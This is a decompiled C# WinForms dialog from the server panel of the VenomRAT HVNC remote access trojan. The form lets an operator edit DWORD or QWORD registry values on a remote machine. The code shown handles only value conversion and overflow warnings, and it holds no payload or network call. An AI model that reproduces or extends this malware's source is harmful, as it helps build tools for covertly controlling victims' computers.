using System;
using System.Windows.Forms;
using Microsoft.Win32;
using VenomRAT_HVNC.Server.Helper;

namespace VenomRAT_HVNC.Server.Forms
{
    // Token: 0x02000077 RID: 119
    public partial class FormRegValueEditWord : Form
    {
        // Token: 0x06000457 RID: 1111 RVA: 0x0002A22C File Offset: 0x0002A22C
        public FormRegValueEditWord(RegistrySeeker.RegValueData value)
        {
            this._value = value;
            this.InitializeComponent();
            this.valueNameTxtBox.Text = value.Name;
            if (value.Kind == RegistryValueKind.DWord)
            {
                this.Text = "Edit DWORD (32-bit) Value";
                this.valueDataTxtBox.Type = WordTextBox.WordType.DWORD;
                this.valueDataTxtBox.Text = global::VenomRAT_HVNC.Server.Helper.ByteConverter.ToUInt32(value.Data).ToString("x");
                return;
            }
            this.Text = "Edit QWORD (64-bit) Value";
            this.valueDataTxtBox.Type = WordTextBox.WordType.QWORD;
            this.valueDataTxtBox.Text = global::VenomRAT_HVNC.Server.Helper.ByteConverter.ToUInt64(value.Data).ToString("x");
        }

        // Token: 0x06000458 RID: 1112 RVA: 0x0002A2DC File Offset: 0x0002A2DC
        private void radioHex_CheckboxChanged(object sender, EventArgs e)
        {
            if (this.valueDataTxtBox.IsHexNumber == this.radioHexa.Checked)
            {
                return;
            }
            if (this.valueDataTxtBox.IsConversionValid() || this.IsOverridePossible())
            {
                this.valueDataTxtBox.IsHexNumber = this.radioHexa.Checked;
                return;
            }
            this.radioDecimal.Checked = true;
        }

        // Token: 0x06000459 RID: 1113 RVA: 0x0002A33C File Offset: 0x0002A33C
        private void okButton_Click(object sender, EventArgs e)
        {
            if (this.valueDataTxtBox.IsConversionValid() || this.IsOverridePossible())
            {
                this._value.Data = ((this._value.Kind == RegistryValueKind.DWord) ? global::VenomRAT_HVNC.Server.Helper.ByteConverter.GetBytes(this.valueDataTxtBox.UIntValue) : global::VenomRAT_HVNC.Server.Helper.ByteConverter.GetBytes(this.valueDataTxtBox.ULongValue));
                base.Tag = this._value;
                base.DialogResult = DialogResult.OK;
            }
            else
            {
                base.DialogResult = DialogResult.None;
            }
            base.Close();
        }

        // Token: 0x0600045A RID: 1114 RVA: 0x0002A3BB File Offset: 0x0002A3BB
        private DialogResult ShowWarning(string msg, string caption)
        {
            return MessageBox.Show(msg, caption, MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation);
        }

        // Token: 0x0600045B RID: 1115 RVA: 0x0002A3C8 File Offset: 0x0002A3C8
        private bool IsOverridePossible()
        {
            string msg = ((this._value.Kind == RegistryValueKind.DWord) ? "The decimal value entered is greater than the maximum value of a DWORD (32-bit number). Should the value be truncated in order to continue?" : "The decimal value entered is greater than the maximum value of a QWORD (64-bit number). Should the value be truncated in order to continue?");
            return this.ShowWarning(msg, "Overflow") == DialogResult.Yes;
        }

        // Token: 0x0400036A RID: 874
        private readonly RegistrySeeker.RegValueData _value;

        // Token: 0x0400036B RID: 875
        private const string DWORD_WARNING = "The decimal value entered is greater than the maximum value of a DWORD (32-bit number). Should the value be truncated in order to continue?";

        // Token: 0x0400036C RID: 876
        private const string QWORD_WARNING = "The decimal value entered is greater than the maximum value of a QWORD (64-bit number). Should the value be truncated in order to continue?";
    }
}